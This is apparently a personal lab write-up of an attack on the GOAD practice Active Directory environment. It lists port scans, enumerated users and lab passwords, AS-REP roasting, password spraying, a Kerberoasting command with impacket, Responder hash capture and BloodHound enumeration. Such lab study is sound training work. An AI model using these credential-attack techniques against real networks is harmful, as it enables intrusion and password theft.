202403010223
Status: #idea
Tags: [[Labs]]

# GOAD
Scope: 192.168.56.0/24

## Recon

- Alive Hosts:

```
192.168.56.10
	PORT     STATE SERVICE
	53/tcp   open  domain
	80/tcp   open  http
	88/tcp   open  kerberos-sec
	135/tcp  open  msrpc
	139/tcp  open  netbios-ssn
	389/tcp  open  ldap
	445/tcp  open  microsoft-ds
	464/tcp  open  kpasswd5
	593/tcp  open  http-rpc-epmap
	636/tcp  open  ldapssl
	3268/tcp open  globalcatLDAP
	3269/tcp open  globalcatLDAPssl
	3389/tcp open  ms-wbt-server
192.168.56.11
PORT     STATE SERVICE
	53/tcp   open  domain
	88/tcp   open  kerberos-sec
	135/tcp  open  msrpc
	139/tcp  open  netbios-ssn
	389/tcp  open  ldap
	445/tcp  open  microsoft-ds
	464/tcp  open  kpasswd5
	593/tcp  open  http-rpc-epmap
	636/tcp  open  ldapssl
	3268/tcp open  globalcatLDAP
	3269/tcp open  globalcatLDAPssl
	3389/tcp open  ms-wbt-server
192.168.56.12
	PORT     STATE SERVICE
	53/tcp   open  domain
	88/tcp   open  kerberos-sec
	135/tcp  open  msrpc
	139/tcp  open  netbios-ssn
	389/tcp  open  ldap
	445/tcp  open  microsoft-ds
	464/tcp  open  kpasswd5
	593/tcp  open  http-rpc-epmap
	636/tcp  open  ldapssl
	3268/tcp open  globalcatLDAP
	3269/tcp open  globalcatLDAPssl
	3389/tcp open  ms-wbt-server
192.168.56.22
	PORT     STATE SERVICE
	80/tcp   open  http
	135/tcp  open  msrpc
	139/tcp  open  netbios-ssn
	445/tcp  open  microsoft-ds
	1433/tcp open  ms-sql-s
	3389/tcp open  ms-wbt-server
192.168.56.23
	PORT     STATE SERVICE
	80/tcp   open  http
	135/tcp  open  msrpc
	139/tcp  open  netbios-ssn
	445/tcp  open  microsoft-ds
	1433/tcp open  ms-sql-s
	3389/tcp open  ms-wbt-server
```

- Users extracted with netexec:

```
Guest
arya.stark
sansa.stark
brandon.stark
rickon.stark
hodor
jon.snow
samwell.tarly  DESC: PASSWORD: Heartsbane
jeor.mormont
sql_svc
```

- Password policy reveals lockout threshold:

```
Account Lockout Threshold: 5
```

- Valid credentials:

```
samwell.tarly:Heartsbane .11 .22 .23
arya.stark:Heartsbane .23
```

Port 445:
- samwell.tarly:
	- BRAAVOS Shares
		- all - R/W EMPTY
	- WINTERFELL Shares
		- IPC$ - R
		- NETLOGON - R
		- SYSVOL -R
	- CASTLEBLACK Shares
		- all - R/W
		- IPC$ - R
		- public - R CANNOT LIST DIRECTORY
- arya.stark
	- BRAAVOS Shares
		- all - R/W EMPTY

ASREP Roast:

- Got an ASREP hash for user `brandon.stark`
- Cracked it with Hashcat: `iseedeadpeople` .11 .22

Credentials Found from Password Spray:

- `sansa.stark:iseedeadpeople` .23

Domains:

```
192.168.56.10 sevenkingdoms.local name:KINGSLANDING DC
192.168.56.11 north.sevenkingdoms.local name:WINTERFELL DC
192.168.56.12 essos.local name:MEEREEN DC
192.168.56.22 north.sevenkingdoms.local name:CASTELBLACK
192.168.56.23 essos.local name:BRAAVOS
```

Kerberoasting with credentials:

```
impacket-GetUserSPNs -request  -dc-ip 192.168.56.11 north.sevenkingdoms.local/samwell.tarly:Heartsbane 
```

- This dumped two hashes. One for jon.snow and one for sql_svc
- Hashcat cracked jon's hash: `jon.snow:iknownothing`

Grabbing NTLMv2 Hash with Responder:

```
responder -dwv -I eth0
```

- I was able to grab `robb.stark`'s hash and crack it with hashcat: `sexywolfy`

Domain Admin within NORTH.SEVENKINGDOMS.LOCAL Domain

- I gathered data for BloodHound and was able to enumerate more users from the SEVENKINGDOMS.LOCAL domain

```
PETYER.BAELISH@SEVENKINGDOMS.LOCAL
MAESTER.PYCELLE@SEVENKINGDOMS.LOCAL
LORD.VARYS@SEVENKINGDOMS.LOCAL
CERSEI.LANNISTER@SEVENKINGDOMS.LOCAL
ROBERT.BARATHEON@SEVENKINGDOMS.LOCAL
RENLY.BARATHEON@SEVENKINGDOMS.LOCAL
STANNIS.BARATHEON@SEVENKINGDOMS.LOCAL
JOFFREY.BARATHEON@SEVENKINGDOMS.LOCAL
ROBERT.BARATHEON@SEVENKINGDOMS.LOCAL
```








<img src="https://github.com/charlier0cks/Pentest-Notes/blob/main/Attachments/wreath_poc.png">

---
# References
